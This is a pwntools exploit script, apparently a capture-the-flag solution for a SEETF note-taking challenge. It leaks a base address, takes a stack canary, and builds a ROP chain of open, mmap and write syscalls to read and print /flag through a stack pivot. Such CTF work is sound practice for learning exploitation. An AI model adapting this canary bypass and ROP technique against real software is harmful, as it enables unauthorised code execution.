from pwn import *
# r = process('./chall')
r = remote('win.the.seetf.sg', 2000)
bin = ELF('./chall')
context.clear(os='linux', arch='x86_64', log_level='debug')

def create():
    r.sendlineafter(b'> ', b'1')

def write(idx: int, size: str, data: bytes):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'idx = ', str(idx).encode())
    r.sendlineafter(b'size to write = ', str(size).encode())
    sleep(1)
    r.send(data)

def read(idx: int):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'idx = ', str(idx).encode())

def debug():
    gdb.attach(r, '''b*0x00000000004018b2''')
    pause()

first = 0
idx = 0
while True:
    create()
    r.recvuntil(b'Note created id ')
    idx = int(r.recvuntil(b'\n')[:-1].decode())
    r.recvuntil(b' is ')
    base = int(r.recv(14), 16)
    log.info('Base: %#x' % base)
    write(idx, 0x1770, b'asdf')
    read(idx)
    r.sendlineafter(b'> ', b'5')
    option = int(input('Ok?'))
    if option == 1:
        canary = int(input('Canary: '), 16)
        break
    # if first == 0:
    #     first = base
    #     continue

    # if base == first-0x1000:
    #     first = base
    # else:
    #     break;

log.info('Canary: %#x' % canary)

pop_r10 = 0x0000000000401497
pop_r8 = 0x000000000040149a
pop_r9 = 0x000000000040149d
pop_rax = 0x0000000000401491
pop_rbp = 0x000000000040129d
pop_rbx = 0x00000000004014a4
pop_rcx = 0x000000000040149e
pop_rdi = 0x000000000040148f
pop_rdx = 0x0000000000401495
pop_rsi =  0x0000000000401493
pop_rsp =  0x00000000004014a0
syscall_ret = 0x00000000004014a8

payload = flat(pop_rax, 2, pop_rdi, base+0xf00, pop_rsi, 0, pop_rdx, 0,\
                syscall_ret, pop_rax, 9, pop_rdi, 0x13370000, pop_rsi, 0x1000,\
                pop_rdx, 7, pop_r10, 2, pop_r8, 3, pop_r9, 0, syscall_ret,\
                pop_rax, 1, pop_rdi, 1, pop_rsi, 0x13370000, pop_rdx, 0x40, syscall_ret)

payload = payload.ljust(0xf00)
payload += b'/flag\0'
write(idx, 4096, payload)

r.sendlineafter(b'> ', b'4'.ljust(0x18, b'\0') + flat(canary, 0, pop_rsp, base))
r.recvuntil(b'SEE')
